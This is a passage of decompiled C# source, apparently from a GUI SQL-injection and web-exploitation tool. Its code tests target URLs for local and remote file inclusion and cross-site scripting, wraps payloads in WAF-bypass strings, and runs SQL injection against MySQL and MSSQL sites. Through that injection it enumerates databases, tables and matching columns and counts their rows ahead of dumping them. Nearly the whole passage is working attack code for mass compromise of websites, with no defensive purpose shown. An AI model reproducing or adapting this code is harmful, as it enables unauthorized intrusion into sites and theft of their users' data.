								foreach (KeyValuePair<string, string> keyValuePair in dictionary)
								{
									string url = text3.Replace("[t]", keyValuePair.Key);
									int num5 = num;
									for (int j = 0; j <= num5; j++)
									{
										this.method_42(null, Class23.smethod_11(class25_0.String_0) + " " + global::Globals.translate_0.GetStr(this, 82, "") + keyValuePair.Key, -1);
										this.method_41(stopwatch_, int_);
										if (class25_0.HTTP.CheckKeyword(url, keyValuePair.Value))
										{
											class25_0.String_1 = url;
											ref int ptr = ref this.struct10_0.int_0;
											this.struct10_0.int_0 = ptr + 1;
											global::Globals.DG_FileInclusao.method_1(new string[]
											{
												class25_0.String_1,
												"LFI",
												"",
												DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
											});
											global::Globals.GStatistics.method_1(Class26.Enum1.const_1, keyValuePair.Key, 1);
											return true;
										}
										int num6 = class25_0.HTTP.Status();
										stopwatch_ = Stopwatch.StartNew();
										if (num6 > 0)
										{
											goto IL_455;
										}
										if (j >= num)
										{
											return false;
										}
										if (this.method_23())
										{
											return false;
										}
									}
									if (this.method_23())
									{
										return false;
									}
								}
							}
							finally
							{
								Dictionary<string, string>.Enumerator enumerator4;
								((IDisposable)enumerator4).Dispose();
							}
							num4++;
						}
						while (num4 <= 1);
					}
				}
				finally
				{
					List<string>.Enumerator enumerator3;
					((IDisposable)enumerator3).Dispose();
				}
				result = false;
			}
			return result;
		}
	}

	// Token: 0x06000ECD RID: 3789 RVA: 0x0005E2F0 File Offset: 0x0005C4F0
	private bool method_39(Class25 class25_0, global::Globals.WebServer webServer_0, string string_5)
	{
		string text = Conversions.ToString(global::Globals.GetObjectValue(this.txtRFIurl));
		int num = Conversions.ToInteger(global::Globals.GetObjectValue(this.numHTTPRetry));
		int int_ = Conversions.ToInteger(global::Globals.GetObjectValue(this.numExploitingDelay));
		string text2 = Conversions.ToString(global::Globals.GetObjectValue(this.txtRFIkeyword));
		text2 = text2.ToLower();
		text2 = text2.Trim();
		checked
		{
			bool result;
			if (string_5.ToLower().Contains(text2.ToLower()))
			{
				result = false;
			}
			else
			{
				text = Class23.smethod_7(text);
				Stopwatch stopwatch_ = Stopwatch.StartNew();
				List<string> list = Class23.smethod_16(class25_0.String_0, text, true);
				class25_0.HTTP.FollowRedirects = false;
				try
				{
					foreach (string url in list)
					{
						if (this.method_23())
						{
							return false;
						}
						int num2 = num;
						for (int i = 0; i <= num2; i++)
						{
							this.method_41(stopwatch_, int_);
							this.method_42(null, Class23.smethod_11(class25_0.String_0) + " " + global::Globals.translate_0.GetStr(this, 83, ""), -1);
							if (class25_0.HTTP.CheckKeyword(url, text2))
							{
								class25_0.String_2 = url;
								ref int ptr = ref this.struct10_0.int_1;
								this.struct10_0.int_1 = ptr + 1;
								global::Globals.DG_FileInclusao.method_1(new string[]
								{
									class25_0.String_2,
									"RFI",
									"",
									DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
								});
								return true;
							}
							int num3 = class25_0.HTTP.Status();
							stopwatch_ = Stopwatch.StartNew();
							if (num3 > 0)
							{
								break;
							}
							if (i >= num)
							{
								return false;
							}
							if (this.method_23())
							{
								return false;
							}
						}
					}
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				result = true;
			}
			return result;
		}
	}

	// Token: 0x06000ECE RID: 3790 RVA: 0x0005E4F8 File Offset: 0x0005C6F8
	private bool method_40(Class25 class25_0, string string_5)
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		int num = Conversions.ToInteger(global::Globals.GetObjectValue(this.numHTTPRetry));
		int int_ = Conversions.ToInteger(global::Globals.GetObjectValue(this.numExploitingDelay));
		try
		{
			foreach (object obj in ((IEnumerable)global::Globals.GetObjectValue(this.lvwXSS)))
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				string text = listViewItem.Text;
				string text2 = listViewItem.SubItems[1].Text;
				if (!string_5.ToLower().Contains(text2.ToLower()))
				{
					dictionary.Add(text, text2);
					dictionary.Add(Class23.smethod_7(text), text2);
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		checked
		{
			bool result;
			if (dictionary.Count == 0)
			{
				result = false;
			}
			else
			{
				Stopwatch stopwatch_ = Stopwatch.StartNew();
				class25_0.HTTP.FollowRedirects = true;
				List<string> list = Class23.smethod_16(class25_0.String_0, "[t]", true);
				try
				{
					List<string>.Enumerator enumerator2 = list.GetEnumerator();
					IL_297:
					while (enumerator2.MoveNext())
					{
						string text3 = enumerator2.Current;
						if (this.method_23())
						{
							return false;
						}
						try
						{
							foreach (KeyValuePair<string, string> keyValuePair in dictionary)
							{
								string url = text3.Replace("[t]", keyValuePair.Key);
								int num2 = num;
								for (int i = 0; i <= num2; i++)
								{
									this.method_42(null, Class23.smethod_11(class25_0.String_0) + " " + global::Globals.translate_0.GetStr(this, 116, "") + keyValuePair.Key, -1);
									this.method_41(stopwatch_, int_);
									if (class25_0.HTTP.CheckKeyword(url, keyValuePair.Value))
									{
										class25_0.String_4 = url;
										ref int ptr = ref this.struct10_0.int_2;
										this.struct10_0.int_2 = ptr + 1;
										global::Globals.DG_FileInclusao.method_1(new string[]
										{
											class25_0.String_4,
											"XSS",
											"",
											DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
										});
										global::Globals.GStatistics.method_1(Class26.Enum1.const_0, keyValuePair.Key, 1);
										return true;
									}
									int num3 = class25_0.HTTP.Status();
									stopwatch_ = Stopwatch.StartNew();
									if (num3 > 0)
									{
										goto IL_297;
									}
									if (i >= num)
									{
										return false;
									}
									if (this.method_23())
									{
										return false;
									}
								}
								if (this.method_23())
								{
									return false;
								}
							}
						}
						finally
						{
							Dictionary<string, string>.Enumerator enumerator3;
							((IDisposable)enumerator3).Dispose();
						}
					}
				}
				finally
				{
					List<string>.Enumerator enumerator2;
					((IDisposable)enumerator2).Dispose();
				}
				result = false;
			}
			return result;
		}
	}

	// Token: 0x06000ECF RID: 3791 RVA: 0x0000814E File Offset: 0x0000634E
	private void method_41(Stopwatch stopwatch_1, int int_14)
	{
		while (!this.method_23())
		{
			Thread.Sleep(100);
			if ((long)int_14 <= stopwatch_1.ElapsedMilliseconds)
			{
				break;
			}
		}
	}

	// Token: 0x06000ED0 RID: 3792 RVA: 0x0005E810 File Offset: 0x0005CA10
	private void method_42(Analyzer analyzer_0, string string_5, int int_14)
	{
		checked
		{
			if (!this.bcWorker.CancellationPending && this.threadPool_0 != null && this.threadPool_0.ThreadCount == 1)
			{
				if (analyzer_0 != null)
				{
					this.method_1(string.Concat(new string[]
					{
						"[ ",
						global::Globals.FormatNumbers(this.int_0 + 1, true),
						"] ",
						analyzer_0.GetDomain,
						" ",
						global::Globals.translate_0.GetStr(this, 29, ""),
						string_5
					}));
				}
				else
				{
					this.method_1(string.Concat(new string[]
					{
						"[ ",
						global::Globals.FormatNumbers(this.int_0 + 1, true),
						"] ",
						global::Globals.translate_0.GetStr(this, 29, ""),
						string_5
					}));
				}
			}
		}
	}

	// Token: 0x06000ED1 RID: 3793 RVA: 0x0005E900 File Offset: 0x0005CB00
	private void method_43(string string_5, string string_6, ref Dictionary<string, string> dictionary_2)
	{
		dictionary_2.Add(string_5, string_6);
		dictionary_2.Add(Class23.smethod_7(string_5), string_6);
		try
		{
			foreach (object obj in ((IEnumerable)global::Globals.GetObjectValue(this.lvwWafs)))
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				dictionary_2.Add(listViewItem.Text + string_5 + listViewItem.SubItems[1].Text, string_6);
				dictionary_2.Add(listViewItem.Text + Class23.smethod_7(string_5) + listViewItem.SubItems[1].Text, string_6);
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000ED2 RID: 3794 RVA: 0x0005E9C8 File Offset: 0x0005CBC8
	private bool method_44(string string_5)
	{
		checked
		{
			int num = this.lstExpoitType.Items.Count - 1;
			bool itemChecked;
			for (int i = 0; i <= num; i++)
			{
				if (this.lstExpoitType.Items[i].ToString().Equals(string_5))
				{
					itemChecked = this.lstExpoitType.GetItemChecked(i);
					return itemChecked;
				}
			}
			return itemChecked;
		}
	}

	// Token: 0x06000ED3 RID: 3795 RVA: 0x0005EA24 File Offset: 0x0005CC24
	private void method_45()
	{
		checked
		{
			if (this.enum6_0 != MainForm.Enum6.const_0 && this.ReExploiterForm != null)
			{
				if (base.InvokeRequired)
				{
					base.Invoke(new MainForm.Delegate49(this.method_45));
				}
				else
				{
					object reExploiterForm = this.ReExploiterForm;
					lock (reExploiterForm)
					{
						if (!this.ReExploiterForm.lvwUnCheckeds.Visible)
						{
							this.ReExploiterForm.Size = new Size(this.ReExploiterForm.lvwUnCheckeds.Columns[0].Width + this.ReExploiterForm.lvwUnCheckeds.Columns[1].Width + 30, 250);
							this.ReExploiterForm.lvwUnCheckeds.Visible = true;
							this.ReExploiterForm.Top = (int)Math.Round(unchecked((double)global::Globals.GMain.Top + (double)global::Globals.GMain.Height / 2.0 - (double)this.ReExploiterForm.Height / 2.0));
							this.ReExploiterForm.Left = (int)Math.Round(unchecked((double)global::Globals.GMain.Left + (double)global::Globals.GMain.Width / 2.0 - (double)this.ReExploiterForm.Width / 2.0));
							this.ReExploiterForm.FormBorderStyle = FormBorderStyle.SizableToolWindow;
							this.ReExploiterForm.CanClose = false;
							this.ReExploiterForm.Show(this);
						}
					}
				}
			}
		}
	}

	// Token: 0x06000ED4 RID: 3796 RVA: 0x0005EBD4 File Offset: 0x0005CDD4
	private void method_46(MainForm.Class49 class49_0)
	{
		try
		{
			Types dbtype = Class54.smethod_6(Conversions.ToString(class49_0.Item.Cells[2].Value));
			object appControlDomain = this.AppControlDomain;
			HTTPExt http;
			lock (appControlDomain)
			{
				http = this.AppControlDomain.GetHTTP();
			}
			Analyzer analyzer = new Analyzer(class49_0.String_0, 2, http);
			analyzer.DBType = dbtype;
			class49_0.o = analyzer;
			global::Globals.DG_SQLi.method_3("", 5, class49_0.Item);
			global::Globals.DG_SQLi.method_3(DateAndTime.Now.ToString(), 6, class49_0.Item);
			if (analyzer.CheckVersionNoCollactions(class49_0.String_0, true))
			{
				ref int ptr = ref this.struct10_0.int_3;
				this.struct10_0.int_3 = checked(ptr + 1);
			}
			else if (!this.bcWorker.CancellationPending)
			{
				this.method_45();
				this.ReExploiterForm.Add(class49_0.Item);
			}
		}
		catch (Exception exception_)
		{
			this.method_24(exception_);
		}
		finally
		{
			try
			{
				if (this.AppControlDomain != null)
				{
					HTTPExt http;
					this.AppControlDomain.Dispose(http);
				}
				if (!this.bcWorker.CancellationPending && this.threadPool_0 != null && class49_0 != null)
				{
					this.threadPool_0.Close(class49_0.Thread);
				}
			}
			catch (Exception exception_2)
			{
				this.method_24(exception_2);
			}
		}
	}

	// Token: 0x06000ED5 RID: 3797 RVA: 0x0005EDB0 File Offset: 0x0005CFB0
	private void method_47()
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			if (!base.InvokeRequired)
			{
				goto IL_2B;
			}
			IL_14:
			num2 = 3;
			base.Invoke(new MainForm.Delegate49(this.method_47));
			goto IL_86;
			IL_2B:
			num2 = 5;
			if (this.searchColumn_0 == null)
			{
				goto IL_86;
			}
			IL_38:
			num2 = 7;
			if (this.enum6_0 == MainForm.Enum6.const_0)
			{
				goto IL_86;
			}
			IL_45:
			num2 = 9;
			if (this.searchColumn_0.Visible)
			{
				goto IL_86;
			}
			IL_55:
			num2 = 11;
			if (this.bcWorker.CancellationPending)
			{
				goto IL_86;
			}
			IL_65:
			num2 = 13;
			if (this.searchColumn_0.Visible)
			{
				goto IL_86;
			}
			IL_78:
			num2 = 14;
			this.searchColumn_0.ShowMe();
			IL_86:
			goto IL_124;
			IL_8B:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_DD:
			goto IL_119;
			IL_DF:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_F7:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_DF;
		}
		IL_119:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_124:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000ED6 RID: 3798 RVA: 0x0005EEFC File Offset: 0x0005D0FC
	private void method_48(MainForm.Class49 class49_0)
	{
		try
		{
			Types dbtype = Class54.smethod_6(Conversions.ToString(class49_0.Item.Cells[2].Value));
			string text = "";
			if (class49_0.Int32_0 == 0)
			{
				this.method_1(global::Globals.translate_0.GetStr(this.DumperForm, 5, ""));
			}
			HTTPExt http = this.AppControlDomain.GetHTTP();
			Analyzer analyzer = new Analyzer(class49_0.String_0, 2, http);
			analyzer.DBType = dbtype;
			class49_0.o = analyzer;
			if (analyzer.CheckVersionNoCollactions(class49_0.String_0, false))
			{
				DataSearch dataSearch = new DataSearch(class49_0.String_0, analyzer, false);
				dataSearch.CurrentDB = class49_0.CurrentDB;
				if (this.threadPool_0.ThreadCount == 1)
				{
					dataSearch.OnProgress += this.method_49;
				}
				dataSearch.SearchColumn(class49_0.Search);
				if (dataSearch.Result.Count > 0)
				{
					text = string.Concat(new string[]
					{
						global::Globals.translate_0.GetStr(this, 91, ""),
						" '",
						class49_0.Search,
						"' ",
						global::Globals.translate_0.GetStr(this, 92, ""),
						" ",
						Strings.FormatNumber(dataSearch.RowsCount, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
						", ",
						global::Globals.translate_0.GetStr(this, 93, ""),
						" ",
						Strings.FormatNumber(dataSearch.Result.Count, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
						" ",
						global::Globals.translate_0.GetStr(this, 94, ""),
						" "
					});
					try
					{
						foreach (string str in dataSearch.Result)
						{
							text = text + "; " + str;
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					object obj = this.searchColumn_0;
					lock (obj)
					{
						this.searchColumn_0.method_1(class49_0.String_0, Class54.smethod_5(class49_0.o.DBType), class49_0.Search, dataSearch.RowsCount, dataSearch.Result);
					}
					ref int ptr = ref this.struct10_0.int_3;
					this.struct10_0.int_3 = checked(ptr + dataSearch.RowsCount);
				}
				else if (dataSearch.RetyFailed)
				{
					global::Globals.DG_SQLi.method_3(global::Globals.translate_0.GetStr(this, 95, ""), 6, class49_0.Item);
				}
				global::Globals.DG_SQLi.method_3(text, 5, class49_0.Item);
				if (!string.IsNullOrEmpty(text))
				{
					this.method_47();
				}
			}
			else
			{
				global::Globals.DG_SQLi.method_3(global::Globals.translate_0.GetStr(this, 88, ""), 5, class49_0.Item);
			}
		}
		catch (Exception exception_)
		{
			this.method_24(exception_);
		}
		finally
		{
			try
			{
				if (!this.bcWorker.CancellationPending)
				{
					if (this.AppControlDomain != null)
					{
						HTTPExt http;
						this.AppControlDomain.Dispose(http);
					}
					if (this.threadPool_0 != null && class49_0 != null)
					{
						this.threadPool_0.Close(class49_0.Thread);
					}
				}
			}
			catch (Exception exception_2)
			{
				this.method_24(exception_2);
			}
		}
	}

	// Token: 0x06000ED7 RID: 3799 RVA: 0x0000816E File Offset: 0x0000636E
	private void method_49(int int_14, string string_5)
	{
		this.int_1 = int_14;
		this.bcWorker.ReportProgress(int_14);
		this.method_1(string_5);
		this.method_29(ProgressBarStyle.Blocks);
	}

	// Token: 0x06000ED8 RID: 3800 RVA: 0x0005F2F8 File Offset: 0x0005D4F8
	private string method_50(MainForm.Class49 class49_0)
	{
		string text = "";
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		if (this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init, ref flag);
			if (this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init.State == 0)
			{
				this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init.State = 2;
				this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS = new Dictionary<string, List<string>>();
			}
			else if (this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS$Init);
			}
		}
		if (this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS.ContainsKey(class49_0.String_0))
		{
			list2 = this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS[class49_0.String_0];
		}
		List<string> list3 = new List<string>();
		string[] array = new string[2];
		string text2 = "";
		List<string> list4 = new List<string>();
		checked
		{
			long num3;
			int num4;
			switch (class49_0.o.DBType)
			{
			case Types.MySQL_No_Error:
			case Types.MySQL_With_Error:
			{
				list3.AddRange(new string[]
				{
					"d.schema_name",
					"t.table_name"
				});
				string text3 = string.Concat(new string[]
				{
					"from information_schema.schemata as d join information_schema.tables as t on t.table_schema = d.schema_name join information_schema.columns as c on c.table_schema = d.schema_name and c.table_name = t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) ",
					class49_0.CurrentDB ? "and d.schema_name = database() " : " ",
					"and c.column_name like ",
					Class23.smethod_20("%" + class49_0.Search + "%"),
					" # group by t.table_name"
				});
				int num = this.method_52(class49_0, class49_0.String_0, "t.table_name", text3.Replace("group by t.table_name", "").Replace("#", ""));
				text3 += " limit [x],[y]";
				if (num == 0)
				{
					return "";
				}
				if (class49_0.o.DBType == Types.MySQL_No_Error)
				{
					text3 = text3.Replace("#", "");
					for (;;)
					{
						int i;
						if (this.threadPool_0.ThreadCount == 1)
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								Conversions.ToString(class49_0.Int32_0 + 1),
								"/",
								Conversions.ToString(class49_0.Count),
								"] ",
								global::Globals.translate_0.GetStr(this, 7, ""),
								" ",
								class49_0.SearchType.ToString(),
								" '",
								class49_0.Search,
								"' [",
								global::Globals.translate_0.GetStr(this, 89, ""),
								" ",
								Conversions.ToString(i + 1),
								"/",
								Conversions.ToString(num),
								" | ",
								Class23.smethod_11(class49_0.String_0)
							}));
						}
						string url = MySQLNoError.Dump(class49_0.String_0, unchecked(-((class49_0.o.MSSQLCollate > false) ? MySQLCollactions.UnHex : MySQLCollactions.None)) ? MySQLCollactions.UnHex : MySQLCollactions.None, false, false, "", "", list3, i, 1, "", "", "", text3);
						Class54.smethod_1(ref url);
						if (this.method_23())
						{
							break;
						}
						string text4 = class49_0.o.HTTPExt_0.QuickGet(url);
						if (!string.IsNullOrEmpty(text4))
						{
							List<string> list5 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
							if (list5.Count <= 0)
							{
								break;
							}
							array = Strings.Split(list5[0], Class54.string_2, -1, CompareMethod.Binary);
							if (array.Length <= 1 || list4.Contains(array[1]))
							{
								break;
							}
							string string_ = "from " + array[0] + "." + array[1];
							int num2 = this.method_52(class49_0, class49_0.String_0, "*", string_);
							if (num2 > 0)
							{
								string item = string.Concat(new string[]
								{
									"[",
									Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
									"] ",
									array[0],
									".",
									array[1]
								});
								list.Add(item);
								list4.Add(array[1]);
								num3 += unchecked((long)num2);
							}
							num4 = 0;
							i++;
							if (!class49_0.AllResults)
							{
								break;
							}
							if (i > num)
							{
								break;
							}
						}
						else
						{
							num4++;
							if (num4 >= class49_0.Retry)
							{
								break;
							}
						}
					}
				}
				else if (class49_0.o.DBType == Types.MySQL_With_Error)
				{
					string text5 = text3;
					List<string> list6 = new List<string>();
					int num5 = num - 1;
					int i = 0;
					while (i <= num5)
					{
						if (list6.Count > 0)
						{
							string text6 = " and not t.table_name in (";
							int num6 = list6.Count - 1;
							for (int j = 0; j <= num6; j++)
							{
								if (j != 0)
								{
									text6 += ",";
								}
								text6 += Class23.smethod_20(list6[j]);
							}
							text6 += ")";
							text3 = text5.Replace("#", text6);
						}
						else
						{
							text3 = text5.Replace("#", "");
						}
						int num7 = 0;
						do
						{
							if (class49_0.CurrentDB & !string.IsNullOrEmpty(text2) & num7 == 0)
							{
								array[0] = text2;
							}
							else
							{
								if (this.threadPool_0.ThreadCount == 1)
								{
									this.method_1(string.Concat(new string[]
									{
										"[",
										Conversions.ToString(class49_0.Int32_0 + 1),
										"/",
										Conversions.ToString(class49_0.Count),
										"] ",
										global::Globals.translate_0.GetStr(this, 7, ""),
										" ",
										class49_0.SearchType.ToString(),
										" '",
										class49_0.Search,
										"' [",
										global::Globals.translate_0.GetStr(this, 89, ""),
										" ",
										Conversions.ToString(i + 1),
										"/",
										Conversions.ToString(num),
										"] [",
										Conversions.ToString(num7 + 1),
										"/2] | ",
										Class23.smethod_11(class49_0.String_0)
									}));
								}
								list3.Clear();
								if (num7 != 0)
								{
									if (num7 == 1)
									{
										list3.Add("t.table_name");
									}
								}
								else
								{
									list3.Add("d.schema_name");
								}
								string url = MySQLWithError.Dump(class49_0.String_0, class49_0.o.MySQLCollactions, class49_0.o.MySQLErrorType, false, "", "", list3, i, 1, "", "", "", text3);
								Class54.smethod_1(ref url);
								if (this.method_23())
								{
									break;
								}
								string text4 = class49_0.o.HTTPExt_0.QuickGet(url);
								if (!string.IsNullOrEmpty(text4))
								{
									List<string> list7 = Class2.Class3_0.Dumper_0.method_17(text4, class49_0.o.DBType, false);
									if (list7.Count <= 0)
									{
										break;
									}
									array[num7] = list7[0];
									if (num7 == 1)
									{
										if (list4.Contains(array[1]))
										{
											break;
										}
										list4.Add(array[1]);
									}
									if (num7 == 0)
									{
										text2 = list7[0];
									}
									num4 = 0;
								}
								else
								{
									num4++;
									if (num4 >= class49_0.Retry)
									{
										break;
									}
								}
							}
							num7++;
						}
						while (num7 <= 1);
						IL_7F9:
						if (string.IsNullOrEmpty(array[0]) || string.IsNullOrEmpty(array[1]))
						{
							break;
						}
						string string_2 = "from " + array[0] + "." + array[1];
						int num2 = this.method_52(class49_0, class49_0.String_0, "*", string_2);
						if (num2 > 0)
						{
							string item2 = string.Concat(new string[]
							{
								"[",
								Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
								"] ",
								array[0],
								".",
								array[1]
							});
							list.Add(item2);
							list6.Add(array[1]);
							num3 += unchecked((long)num2);
						}
						array = new string[3];
						if (class49_0.AllResults)
						{
							i++;
							continue;
						}
						break;
						goto IL_7F9;
					}
				}
				break;
			}
			case Types.MSSQL_No_Error:
			case Types.MSSQL_With_Error:
			{
				Types dbtype = class49_0.o.DBType;
				InjectionType oError;
				if (dbtype != Types.MSSQL_No_Error)
				{
					if (dbtype == Types.MSSQL_With_Error)
					{
						oError = InjectionType.Error;
					}
				}
				else
				{
					oError = InjectionType.Union;
				}
				int i;
				if (list2.Count == 0)
				{
					string text4;
					List<string> list8;
					do
					{
						if (this.threadPool_0.ThreadCount == 1)
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								Conversions.ToString(class49_0.Int32_0 + 1),
								"/",
								Conversions.ToString(class49_0.Count),
								"] ",
								global::Globals.translate_0.GetStr(this, 7, ""),
								" ",
								class49_0.SearchType.ToString(),
								" '",
								class49_0.Search,
								"' ",
								global::Globals.translate_0.GetStr(this, 90, ""),
								" | ",
								Class23.smethod_11(class49_0.String_0)
							}));
						}
						list8 = new List<string>();
						list8.Add("DB_NAME()");
						string url = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list8, class49_0.o.MSSQLCast, "");
						Class54.smethod_1(ref url);
						text4 = class49_0.o.HTTPExt_0.QuickGet(url);
						if (!string.IsNullOrEmpty(text4))
						{
							goto IL_A78;
						}
						num4++;
					}
					while (num4 < class49_0.Retry);
					break;
					IL_A78:
					list8 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
					if (list8.Count != 0)
					{
						list2.Add(list8[0]);
					}
					num4 = 0;
					i = 0;
					if (!class49_0.CurrentDB)
					{
						for (;;)
						{
							if (this.threadPool_0.ThreadCount == 1)
							{
								this.method_1(string.Concat(new string[]
								{
									"[",
									Conversions.ToString(class49_0.Int32_0 + 1),
									"/",
									Conversions.ToString(class49_0.Count),
									"] Search ",
									class49_0.SearchType.ToString(),
									" '",
									class49_0.Search,
									"' Loading DB ",
									Conversions.ToString(i),
									" | ",
									Class23.smethod_11(class49_0.String_0)
								}));
							}
							list8.Clear();
							list8.Add("DB_NAME(" + Conversions.ToString(i) + ")");
							if (this.method_23())
							{
								break;
							}
							string url = MSSQL.Info(class49_0.String_0, oError, class49_0.o.MSSQLCollate, list8, "char", "");
							Class54.smethod_1(ref url);
							text4 = class49_0.o.HTTPExt_0.QuickGet(url);
							if (!string.IsNullOrEmpty(text4))
							{
								list8 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
								if (list8.Count == 0)
								{
									goto IL_C71;
								}
								if (!list2.Contains(list8[0]))
								{
									list2.Add(list8[0]);
								}
								num4 = 0;
								i++;
							}
							else
							{
								num4++;
								if (num4 >= class49_0.Retry)
								{
									break;
								}
							}
						}
						break;
					}
				}
				IL_C71:
				num4 = 0;
				i = 0;
				if (list2.Contains("master"))
				{
					list2.Remove("master");
				}
				if (list2.Contains("model"))
				{
					list2.Remove("model");
				}
				if (list2.Contains("msdb"))
				{
					list2.Remove("msdb");
				}
				if (list2.Contains("tempdb"))
				{
					list2.Remove("tempdb");
				}
				if (list2.Count != 0)
				{
					if (this.method_23())
					{
						goto IL_11C5;
					}
					object obj = this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS;
					lock (obj)
					{
						if (!this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS.ContainsKey(class49_0.String_0))
						{
							this.$STATIC$AnalizerCheckColumn$201E1283BC$cDBS.Add(class49_0.String_0, list2);
						}
						goto IL_11C5;
					}
					IL_D44:
					string text7 = list2[i];
					string text3 = "select cast(count(t.name) as char) as x from [" + text7 + "]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like " + Class23.smethod_21("%" + class49_0.Search + "%", false, "+", "char");
					if (this.threadPool_0.ThreadCount == 1)
					{
						this.method_1(string.Concat(new string[]
						{
							"[",
							Conversions.ToString(class49_0.Int32_0 + 1),
							"/",
							Conversions.ToString(class49_0.Count),
							"] Search ",
							class49_0.SearchType.ToString(),
							" '",
							class49_0.Search,
							"' [",
							Conversions.ToString(i + 1),
							"/",
							Conversions.ToString(list2.Count),
							"] Checking Tables on DB '",
							text7,
							"'  | ",
							Class23.smethod_11(class49_0.String_0)
						}));
					}
					int num = this.method_52(class49_0, class49_0.String_0, "", text3);
					text3 = string.Concat(new string[]
					{
						"select top 1 x from ( select distinct top [x] (t.name) as x from [",
						text7,
						"]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like ",
						Class23.smethod_21("%" + class49_0.Search + "%", false, "+", "char"),
						" order by x asc) sq order by x desc"
					});
					if (num == 0)
					{
						i++;
					}
					else
					{
						int num8 = 0;
						for (;;)
						{
							if (this.threadPool_0.ThreadCount == 1)
							{
								this.method_1(string.Concat(new string[]
								{
									"[",
									Conversions.ToString(class49_0.Int32_0 + 1),
									"/",
									Conversions.ToString(class49_0.Count),
									"] ",
									global::Globals.translate_0.GetStr(this, 7, ""),
									" ",
									class49_0.SearchType.ToString(),
									class49_0.Search,
									"' [",
									Conversions.ToString(i + 1),
									"/",
									Conversions.ToString(list2.Count),
									"]  DB '",
									text7,
									"' Table ",
									Conversions.ToString(num8),
									" | ",
									Class23.smethod_11(class49_0.String_0)
								}));
							}
							string url = MSSQL.Dump(class49_0.String_0, "", "", null, false, oError, "char", class49_0.o.MSSQLCollate, num8, 0, "", "", "", text3, -1);
							Class54.smethod_1(ref url);
							if (this.method_23())
							{
								goto IL_11D6;
							}
							string text4 = class49_0.o.HTTPExt_0.QuickGet(url);
							if (!string.IsNullOrEmpty(text4))
							{
								List<string> list8 = this.DumperForm.method_17(text4, class49_0.o.DBType, false);
								if (list8.Count <= 0)
								{
									break;
								}
								array = Strings.Split(list8[0], Class54.string_2, -1, CompareMethod.Binary);
								if (array.Length <= 0 || list4.Contains(array[0]))
								{
									break;
								}
								string string_3 = string.Concat(new string[]
								{
									"select cast(isnull(count(*),char(32)) as char) as x from [",
									text7,
									"]..[",
									array[0],
									"]"
								});
								int num2 = this.method_52(class49_0, class49_0.String_0, "*", string_3);
								if (num2 > 0)
								{
									string item3 = string.Concat(new string[]
									{
										"[",
										Strings.FormatNumber(num2, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
										"] ",
										text7,
										".",
										array[0]
									});
									list.Add(item3);
									list4.Add(array[0]);
									num3 += unchecked((long)num2);
								}
								else if (num2 == -1)
								{
									break;
								}
								num4 = 0;
								if (!class49_0.AllResults)
								{
									break;
								}
								num8++;
								if (num8 > num)
								{
									break;
								}
							}
							else
							{
								num4++;
								if (num4 >= class49_0.Retry)
								{
									break;
								}
							}
						}
						i++;
					}
					IL_11C5:
					if (i <= list2.Count - 1)
					{
						goto IL_D44;
					}
				}
				break;
			}
			case Types.Oracle_No_Error:
			case Types.Oracle_With_Error:
				return "";
			}
			IL_11D6:
			list.Sort();
			if (list.Count > 0)
			{
